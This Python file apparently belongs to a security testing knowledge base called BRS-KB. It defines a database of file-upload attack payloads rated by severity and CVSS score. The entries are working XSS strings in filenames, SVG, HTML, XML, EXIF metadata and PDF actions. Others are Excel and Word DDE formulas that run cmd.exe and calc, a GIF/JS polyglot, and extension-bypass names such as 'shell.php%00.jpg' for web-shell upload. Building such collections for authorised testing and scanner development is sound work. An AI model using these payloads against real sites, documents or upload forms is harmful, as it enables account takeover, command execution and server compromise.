#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26

File Upload XSS Payloads
XSS via file names, metadata, and content
"""

from ..models import PayloadEntry


FILE_UPLOAD_XSS_DATABASE = {
    # ===== FILENAME XSS =====
    "file_name_001": PayloadEntry(
        payload='"><script>alert(1)</script>.jpg',
        contexts=["html_attribute", "html_content"],
        tags=["file_upload", "filename"],
        severity="high",
        cvss_score=7.5,
        description="XSS in filename",
        reliability="high",
    ),
    "file_name_002": PayloadEntry(
        payload="<img src=x onerror=alert(1)>.jpg",
        contexts=["html_content"],
        tags=["file_upload", "filename"],
        severity="high",
        cvss_score=7.5,
        description="Img tag in filename",
        reliability="high",
    ),
    "file_name_003": PayloadEntry(
        payload="test'.jpg",
        contexts=["javascript"],
        tags=["file_upload", "filename", "sqli"],
        severity="medium",
        cvss_score=5.0,
        description="Quote in filename",
        reliability="high",
    ),
    "file_name_004": PayloadEntry(
        payload="${7*7}.jpg",
        contexts=["template"],
        tags=["file_upload", "filename", "ssti"],
        severity="medium",
        cvss_score=5.0,
        description="SSTI in filename",
        reliability="medium",
    ),
    # ===== SVG FILE XSS =====
    "file_svg_001": PayloadEntry(
        payload='<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>',
        contexts=["svg"],
        tags=["file_upload", "svg"],
        severity="high",
        cvss_score=7.5,
        description="SVG file with onload",
        reliability="high",
    ),
    "file_svg_002": PayloadEntry(
        payload='<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
        contexts=["svg"],
        tags=["file_upload", "svg", "script"],
        severity="high",
        cvss_score=7.5,
        description="SVG file with script",
        reliability="high",
    ),
    "file_svg_003": PayloadEntry(
        payload='<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body onload=alert(1)></foreignObject></svg>',
        contexts=["svg"],
        tags=["file_upload", "svg", "foreignObject"],
        severity="high",
        cvss_score=7.5,
        description="SVG foreignObject XSS",
        reliability="high",
    ),
    # ===== HTML FILE XSS =====
    "file_html_001": PayloadEntry(
        payload="<html><body><script>alert(1)</script></body></html>",
        contexts=["html_content"],
        tags=["file_upload", "html"],
        severity="high",
        cvss_score=7.5,
        description="HTML file XSS",
        reliability="high",
    ),
    "file_html_002": PayloadEntry(
        payload="<html><body onload=alert(1)></body></html>",
        contexts=["html_content"],
        tags=["file_upload", "html"],
        severity="high",
        cvss_score=7.5,
        description="HTML body onload",
        reliability="high",
    ),
    # ===== XML FILE XSS =====
    "file_xml_001": PayloadEntry(
        payload='<?xml version="1.0"?><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>',
        contexts=["xml"],
        tags=["file_upload", "xml"],
        severity="high",
        cvss_score=7.5,
        description="XML namespace script",
        reliability="medium",
    ),
    # ===== EXIF METADATA XSS =====
    "file_exif_001": PayloadEntry(
        payload="ImageDescription: <script>alert(1)</script>",
        contexts=["html_content"],
        tags=["file_upload", "exif", "metadata"],
        severity="high",
        cvss_score=7.5,
        description="EXIF ImageDescription XSS",
        reliability="medium",
    ),
    "file_exif_002": PayloadEntry(
        payload='Artist: "><img src=x onerror=alert(1)>',
        contexts=["html_content", "html_attribute"],
        tags=["file_upload", "exif", "metadata"],
        severity="high",
        cvss_score=7.5,
        description="EXIF Artist XSS",
        reliability="medium",
    ),
    "file_exif_003": PayloadEntry(
        payload="Copyright: <svg onload=alert(1)>",
        contexts=["html_content"],
        tags=["file_upload", "exif", "metadata"],
        severity="high",
        cvss_score=7.5,
        description="EXIF Copyright XSS",
        reliability="medium",
    ),
    # ===== PDF FILE XSS =====
    "file_pdf_001": PayloadEntry(
        payload="/OpenAction<</S/JavaScript/JS(app.alert(1))>>",
        contexts=["url"],
        tags=["file_upload", "pdf"],
        severity="high",
        cvss_score=7.5,
        description="PDF JavaScript action",
        reliability="medium",
    ),
    # ===== DOCX/XLSX XSS =====
    "file_docx_001": PayloadEntry(
        payload='=cmd|"/C calc"!A0',
        contexts=["html_content"],
        tags=["file_upload", "xlsx", "dde"],
        severity="high",
        cvss_score=7.5,
        description="Excel DDE formula",
        reliability="medium",
    ),
    "file_docx_002": PayloadEntry(
        payload='<w:fldSimple w:instr="DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe /k calc.exe">',
        contexts=["xml"],
        tags=["file_upload", "docx", "dde"],
        severity="high",
        cvss_score=7.5,
        description="Word DDE field",
        reliability="low",
    ),
    # ===== GIF XSS =====
    "file_gif_001": PayloadEntry(
        payload="GIF89a/*<svg/onload=alert(1)>*/",
        contexts=["html_content"],
        tags=["file_upload", "gif", "polyglot"],
        severity="high",
        cvss_score=7.5,
        description="GIF/JS polyglot",
        reliability="low",
    ),
    # ===== CONTENT-TYPE BYPASS =====
    "file_ct_001": PayloadEntry(
        payload="Content-Type: image/gif\n\nGIF89a<script>alert(1)</script>",
        contexts=["html_content"],
        tags=["file_upload", "content-type", "bypass"],
        severity="high",
        cvss_score=7.5,
        description="Content-Type bypass",
        reliability="medium",
    ),
    # ===== NULL BYTE EXTENSION =====
    "file_null_001": PayloadEntry(
        payload="shell.php%00.jpg",
        contexts=["url"],
        tags=["file_upload", "null_byte", "bypass"],
        severity="critical",
        cvss_score=9.0,
        description="Null byte extension bypass",
        reliability="low",
    ),
    "file_null_002": PayloadEntry(
        payload="shell.php;.jpg",
        contexts=["url"],
        tags=["file_upload", "semicolon", "bypass"],
        severity="high",
        cvss_score=7.5,
        description="Semicolon extension bypass",
        reliability="low",
    ),
}

FILE_UPLOAD_XSS_TOTAL = len(FILE_UPLOAD_XSS_DATABASE)
